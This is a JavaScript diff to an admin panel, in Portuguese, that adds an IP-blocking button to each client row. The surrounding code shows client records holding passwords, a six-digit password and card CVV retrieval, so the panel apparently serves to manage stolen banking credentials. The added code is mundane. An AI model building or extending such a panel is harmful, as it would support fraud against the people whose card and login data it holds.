@@ -222,6 +222,38 @@ const panel = (() => {
         roleTime.innerHTML = seconds = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)
     }
 
+    async function handleBlockIp(button) {
+        try {
+            if (!button) return
+
+            const id_client = button.dataset.client
+
+            button.addEventListener('click', async function (e) {
+                e.preventDefault()
+
+                console.log(`id cliente block`, id_client)
+
+                if (!id_client) return console.log(`ID do cliente não identificado`)
+
+                const token = document.body.dataset.token
+
+                const config = {
+                    method: `post`,
+                    headers: {
+                        'Content-Type': 'application/json',
+                        authorization: `Bearer ${token}`,
+                    },
+                }
+
+                const ipBlocked = await (await fetch(`/api/blocked_ip/${id_client}`, config)).json()
+
+                console.log(`ip bloqueado: `, ipBlocked)
+            })
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
     function createClient(client) {
         const { id, user, password, password6, type, auth } = client
         const tr = document.createElement('tr')
@@ -241,10 +273,14 @@ const panel = (() => {
             }">
                 ${client.device.type || `Desconhecido`}
             </span>
+            <button data-client="${id}">Bloquear ip</button>
         </td>
         `
 
         //timer(roleTime)
+        const buttonBlock = tr.querySelector('td[role="device"] button')
+
+        handleBlockIp(buttonBlock)
 
         clickInfo(tr)
         new bootstrap.Tooltip(tr.querySelector('[data-bs-toggle="tooltip"]'))
@@ -254,6 +290,14 @@ const panel = (() => {
         }, 600)
 
         document.querySelector('.productList').prepend(tr)
+    }
+
+    function BlockIp(buttons) {
+        if (!buttons) return
+
+        for (const button of buttons) {
+            handleBlockIp(button)
+        }
     }
 
     function clientEnter() {
@@ -752,9 +796,13 @@ const panel = (() => {
         changePassword,
         excludeUser,
         getCardNumber,
+        BlockIp,
     }
 })()
 
+const buttonsBlock = document.querySelectorAll('.productList td[role="device"] button')
+
+panel.BlockIp(buttonsBlock)
 panel.getCardNumber(`.getCVV`)
 panel.excludeUser()
 panel.changePassword()
